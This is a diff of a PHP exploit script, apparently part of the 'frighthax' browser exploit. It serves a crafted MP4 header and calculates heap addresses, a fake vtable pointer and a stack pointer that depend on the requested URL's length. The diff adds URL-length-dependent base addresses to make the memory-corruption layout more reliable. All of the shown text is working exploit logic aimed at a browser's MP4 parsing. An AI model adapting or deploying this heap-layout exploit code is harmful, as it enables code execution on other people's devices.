@@ -17,11 +17,26 @@ if(($browserver & 0x80) == 0)
 
 $con = file_get_contents("frighthax_header.mp4");
 
-//url_len = strlen("http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);//The address of the below mp4 buffer varies depending on the length of the requested URL.
-//$heapaddr_stscarraydata_off_x1200 = 0x39531c88+0x577+0x1201 + (($url_len - 37) * 0x2);
-//$heapaddr_stscarraydata_off_x1200 = ($heapaddr_stscarraydata_off_x1200 + 0x3) & ~0x3;
-
-$heapaddr_stscarraydata_off_x1200 = 0x39533680;//Offset 0x1201 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4. This hax will work fine as long as this address lands at <stsc entries data start>+0x201 .. <stsc entries data start>+0x21f1, and is 0x10-byte aligned relative to <stsc entries data start>+0x201.
+$url_len = strlen("http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']) + 1;//The address of the below mp4 buffer varies depending on the length of the requested URL. Only URLs with string length < 48 characters is currently supported(without updating the below code).
+$baseaddr = 0x39531f00;
+if($url_len < 33)
+{
+	$baseaddr = 0x39531ea0;
+}
+else
+{
+	if($url_len < 41)
+	{
+		$url_len-= 32;
+	}
+	else
+	{
+		$url_len-= 40;
+		$baseaddr = 0x39531f10;
+	}
+}
+$heapaddr_stscarraydata_off_x1200 = /*0x39531c88*/$baseaddr+0x577+0x1201 + (($url_len + 0x3) & ~0x3);
+//$heapaddr_stscarraydata_off_x1200 = 0x39533680;//Offset 0x1201 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4. This hax will work fine as long as this address lands at <stsc entries data start>+0x201 .. <stsc entries data start>+0x21f1, and is 0x10-byte aligned relative to <stsc entries data start>+0x201.
 $fake_vtableptr = $heapaddr_stscarraydata_off_x1200+0x2000;
 $stackptr = $fake_vtableptr+0x2000;
 
